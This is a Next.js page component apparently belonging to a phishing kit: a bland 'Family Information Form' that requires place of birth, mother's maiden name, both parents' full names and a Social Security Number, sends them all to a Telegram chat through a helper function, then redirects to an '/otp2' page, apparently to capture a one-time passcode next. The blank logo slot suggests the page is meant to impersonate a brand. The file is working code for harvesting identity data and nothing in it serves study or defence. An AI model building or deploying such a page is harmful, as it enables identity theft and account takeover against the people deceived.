"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";
import { sendTelegramMessage } from "../../utils/telegram";

const validateInput = (field: string, value: string): string => {
  switch (field) {
    case "placeOfBirth":
    case "motherMaidenName":
    case "motherFullName":
    case "fatherFullName":
    case "ssn":
      return value.trim() ? "" : "This field is required.";
    default:
      return "";
  }
};

const FormPage = () => {
  type FormErrors = {
    placeOfBirth?: string;
    motherMaidenName?: string;
    motherFullName?: string;
    fatherFullName?: string;
    ssn?: string;
  };
  
  const [formErrors, setFormErrors] = useState<FormErrors>({});
  const [placeOfBirth, setPlaceOfBirth] = useState<string>("");
  const [motherMaidenName, setMotherMaidenName] = useState<string>("");
  const [motherFullName, setMotherFullName] = useState<string>("");
  const [fatherFullName, setFatherFullName] = useState<string>("");
  const [ssn, setSsn] = useState<string>("");
  const router = useRouter();

  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    
    const formData = {
      placeOfBirth,
      motherMaidenName,
      motherFullName,
      fatherFullName,
      ssn
    };

    const errors: Record<string, string> = {};

    Object.keys(formData).forEach((field) => {
      const error = validateInput(field, formData[field as keyof typeof formData]);
      if (error) errors[field] = error;
    });

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      return;
    }

    const message = `New Submission:
      - Place of Birth: ${formData.placeOfBirth}
      - Mother's Maiden Name: ${formData.motherMaidenName}
      - Mother's Full Name: ${formData.motherFullName}
      - Father's Full Name: ${formData.fatherFullName}
      - SSN: ${formData.ssn}
      - Time: ${new Date().toLocaleString()}`;

    try {
      await sendTelegramMessage(message);
      router.push("/otp2");
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
      alert("An error occurred while submitting the form. Please try again.");
    }
  };

  return (
    <>
      <Head>
        <title>Family Information Form</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <style>{`
          input:-webkit-autofill,
          select:-webkit-autofill {
            background-color: transparent !important;
            color: black !important;
            -webkit-box-shadow: 0 0 0px 1000px white inset !important;
          }
        `}</style>
      </Head>

      <div className="min-h-screen flex flex-col bg-gray-50">
        <header className="bg-[#66d3ee] border-b-4">
          <div className="max-w-7xl mx-auto flex items-center p-4">
            <a href="#" className="flex items-center">
              {/* Logo or heading here */}
            </a>
          </div>
        </header>

        <main className="flex-grow container mx-auto mt-12 px-4">
          <div className="max-w-lg mx-auto bg-white p-10 shadow-lg rounded-xl">
            <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">Family Information Form</h1>
            <p className="text-sm text-gray-600 text-center mb-8">Please provide the following information.</p>
            <form onSubmit={handleFormSubmit} aria-label="Family information form">
              {/* Place of Birth */}
              <div className="mb-6">
                <label htmlFor="placeOfBirth" className="block text-sm font-medium text-black">Place of Birth</label>
                <input
                  id="placeOfBirth"
                  name="placeOfBirth"
                  type="text"
                  required
                  value={placeOfBirth}
                  onChange={(e) => setPlaceOfBirth(e.target.value)}
                  className={`w-full mt-2 border ${formErrors.placeOfBirth ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.placeOfBirth ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                />
                {formErrors.placeOfBirth && <p className="text-sm text-red-500 mt-2">{formErrors.placeOfBirth}</p>}
              </div>

              {/* Mother's Maiden Name */}
              <div className="mb-6">
                <label htmlFor="motherMaidenName" className="block text-sm font-medium text-black">Mother&apos;s Maiden Name</label>
                <input
                  id="motherMaidenName"
                  name="motherMaidenName"
                  type="text"
                  required
                  value={motherMaidenName}
                  onChange={(e) => setMotherMaidenName(e.target.value)}
                  className={`w-full mt-2 border ${formErrors.motherMaidenName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.motherMaidenName ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                />
                {formErrors.motherMaidenName && <p className="text-sm text-red-500 mt-2">{formErrors.motherMaidenName}</p>}
              </div>

              {/* Mother's Full Name */}
              <div className="mb-6">
                <label htmlFor="motherFullName" className="block text-sm font-medium text-black">Mother&apos;s Full Name</label>
                <input
                  id="motherFullName"
                  name="motherFullName"
                  type="text"
                  required
                  value={motherFullName}
                  onChange={(e) => setMotherFullName(e.target.value)}
                  className={`w-full mt-2 border ${formErrors.motherFullName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.motherFullName ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                />
                {formErrors.motherFullName && <p className="text-sm text-red-500 mt-2">{formErrors.motherFullName}</p>}
              </div>

              {/* Father's Full Name */}
              <div className="mb-6">
                <label htmlFor="fatherFullName" className="block text-sm font-medium text-black">Father&apos;s Full Name</label>
                <input
                  id="fatherFullName"
                  name="fatherFullName"
                  type="text"
                  required
                  value={fatherFullName}
                  onChange={(e) => setFatherFullName(e.target.value)}
                  className={`w-full mt-2 border ${formErrors.fatherFullName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.fatherFullName ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                />
                {formErrors.fatherFullName && <p className="text-sm text-red-500 mt-2">{formErrors.fatherFullName}</p>}
              </div>

              {/* SSN */}
              <div className="mb-6">
                <label htmlFor="ssn" className="block text-sm font-medium text-black">Social Security Number (SSN)</label>
                <input
                  id="ssn"
                  name="ssn"
                  type="text"
                  required
                  value={ssn}
                  onChange={(e) => setSsn(e.target.value)}
                  className={`w-full mt-2 border ${formErrors.ssn ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.ssn ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                  placeholder="XXX-XX-XXXX"
                />
                {formErrors.ssn && <p className="text-sm text-red-500 mt-2">{formErrors.ssn}</p>}
              </div>

              <div className="flex justify-center mb-8">
                <button type="submit" className="w-full bg-[#66d3ee] hover:bg-[#4ea8c8] text-white p-4 rounded-xl shadow-md focus:outline-none">
                  Submit
                </button>
              </div>
            </form>
          </div>
        </main>
      </div>
    </>
  );
};

export default FormPage;